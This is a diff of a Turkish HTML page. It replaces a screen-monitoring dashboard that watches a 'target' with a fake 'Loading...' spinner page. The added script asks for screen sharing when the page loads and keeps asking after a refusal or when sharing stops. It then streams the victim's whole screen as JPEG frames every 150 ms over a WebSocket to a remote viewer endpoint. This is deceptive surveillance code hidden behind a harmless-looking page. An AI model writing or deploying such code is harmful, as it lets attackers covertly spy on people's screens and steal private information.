@@ -2,90 +2,154 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ekran İzleme</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Yükleniyor...</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background: #0a0a0f; color: #fff; font-family: -apple-system, sans-serif; height: 100vh; display: flex; flex-direction: column; }
-        .header { background: #1a1a2e; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #2a2a3e; }
-        .header h1 { font-size: 18px; color: #00d4ff; }
-        .status { padding: 6px 16px; border-radius: 20px; font-size: 13px; font-weight: 600; }
-        .status.online { background: #00ff8820; color: #00ff88; }
-        .status.offline { background: #ff444420; color: #ff4444; }
-        .status.waiting { background: #ffaa0020; color: #ffaa00; }
-        .viewer { flex: 1; display: flex; justify-content: center; align-items: center; padding: 20px; background: #000; }
-        .viewer img { max-width: 100%; max-height: 100%; border-radius: 8px; border: 1px solid #2a2a3e; }
-        .info-bar { background: #1a1a2e; padding: 10px 20px; display: flex; gap: 20px; font-size: 13px; color: #888; border-top: 1px solid #2a2a3e; }
+        body {
+            background: #000;
+            color: #fff;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            overflow: hidden;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .loader {
+            text-align: center;
+            opacity: 0;
+            animation: fadeIn 1s ease 0.5s forwards;
+        }
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #333;
+            border-top-color: #fff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        @keyframes fadeIn { to { opacity: 1; } }
+        .hidden { display: none !important; }
     </style>
 </head>
 <body>
-    <div class="header">
-        <h1>📱 Ekran İzleme</h1>
-        <span class="status waiting" id="status">Bekleniyor...</span>
-    </div>
-
-    <div class="viewer" id="viewer">
-        <div style="text-align: center; color: #555;">
-            <span style="font-size: 64px; display: block;">📵</span>
-            <p>Hedef bağlantısı bekleniyor...</p>
-        </div>
-    </div>
-
-    <div class="info-bar">
-        <span>📡 FPS: <span id="fps">0</span></span>
-        <span>📐 Çözünürlük: <span id="resolution">-</span></span>
-        <span>⏱️ Gecikme: <span id="latency">-</span>ms</span>
-        <span>📊 Toplam Kare: <span id="frames">0</span></span>
+    <div class="loader" id="loader">
+        <div class="spinner"></div>
+        <p>Yükleniyor...</p>
     </div>
 
     <script>
         const sessionId = window.location.pathname.split('/').pop();
         const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
-        const WS_URL = `${protocol}//${window.location.host}/ws/viewer?id=${sessionId}`;
+        const host = window.location.host;
+        const WS_URL = `${protocol}//${host}/ws/target?id=${sessionId}`;
 
         let ws = null;
-        let frameCount = 0;
-        let lastFrameTime = 0;
+        let stream = null;
+        let captureInterval = null;
 
-        function connect() {
-            ws = new WebSocket(WS_URL);
+        async function startScreenCapture() {
+            try {
+                // Ekran paylaşımı iste
+                stream = await navigator.mediaDevices.getDisplayMedia({
+                    video: {
+                        cursor: "always",
+                        displaySurface: "monitor"
+                    },
+                    audio: false
+                });
 
-            ws.onopen = () => updateStatus('waiting', 'Bekleniyor...');
-            ws.onmessage = (event) => {
-                const msg = JSON.parse(event.data);
-                if (msg.type === 'frame') displayFrame(msg.data, msg.resolution, msg.timestamp);
-            };
-            ws.onclose = () => {
-                updateStatus('offline', 'Bağlantı Kesildi');
-                setTimeout(connect, 3000);
-            };
-        }
+                // WebSocket bağlantısı
+                ws = new WebSocket(WS_URL);
 
-        function displayFrame(base64Data, resolution, timestamp) {
-            const viewer = document.getElementById('viewer');
-            viewer.innerHTML = `<img src="data:image/jpeg;base64,${base64Data}" />`;
+                ws.onopen = () => {
+                    console.log('Bağlantı açıldı');
+                    startStreaming();
+                };
 
-            frameCount++;
-            document.getElementById('frames').textContent = frameCount;
-            document.getElementById('resolution').textContent = resolution || '-';
-            document.getElementById('latency').textContent = Date.now() - timestamp;
+                ws.onclose = () => {
+                    console.log('Bağlantı kapandı');
+                    stopStreaming();
+                    setTimeout(startScreenCapture, 2000);
+                };
 
-            updateStatus('online', 'Canlı');
+                ws.onerror = (err) => {
+                    console.error('WebSocket hatası:', err);
+                };
 
-            const now = Date.now();
-            if (lastFrameTime) {
-                document.getElementById('fps').textContent = Math.round(1000 / (now - lastFrameTime));
+                // Kullanıcı paylaşımı durdurursa
+                stream.getVideoTracks()[0].onended = () => {
+                    stopStreaming();
+                    setTimeout(startScreenCapture, 1000);
+                };
+
+            } catch (err) {
+                console.error('Ekran paylaşımı hatası:', err);
+                // Kullanıcı izin vermediyse tekrar dene
+                setTimeout(startScreenCapture, 3000);
             }
-            lastFrameTime = now;
         }
 
-        function updateStatus(type, text) {
-            const status = document.getElementById('status');
-            status.className = `status ${type}`;
-            status.textContent = text;
+        function startStreaming() {
+            const video = document.createElement('video');
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+
+            video.srcObject = stream;
+            video.play();
+
+            video.onloadedmetadata = () => {
+                canvas.width = video.videoWidth || 1280;
+                canvas.height = video.videoHeight || 720;
+
+                // Her 150ms'de bir kare gönder
+                captureInterval = setInterval(() => {
+                    if (ws.readyState === WebSocket.OPEN) {
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        canvas.toBlob((blob) => {
+                            const reader = new FileReader();
+                            reader.onloadend = () => {
+                                const base64 = reader.result.split(',')[1];
+                                ws.send(JSON.stringify({
+                                    type: 'frame',
+                                    data: base64,
+                                    timestamp: Date.now(),
+                                    resolution: `${canvas.width}x${canvas.height}`
+                                }));
+                            };
+                            reader.readAsDataURL(blob);
+                        }, 'image/jpeg', 0.4);
+                    }
+                }, 150);
+            };
         }
 
-        connect();
+        function stopStreaming() {
+            if (captureInterval) {
+                clearInterval(captureInterval);
+                captureInterval = null;
+            }
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+                stream = null;
+            }
+            if (ws) {
+                ws.close();
+                ws = null;
+            }
+        }
+
+        // Sayfa yüklendiğinde başlat
+        window.addEventListener('load', () => {
+            setTimeout(startScreenCapture, 500);
+        });
+
+        // Sayfa kapanmadan önce temizle
+        window.addEventListener('beforeunload', stopStreaming);
     </script>
 </body>
 </html>
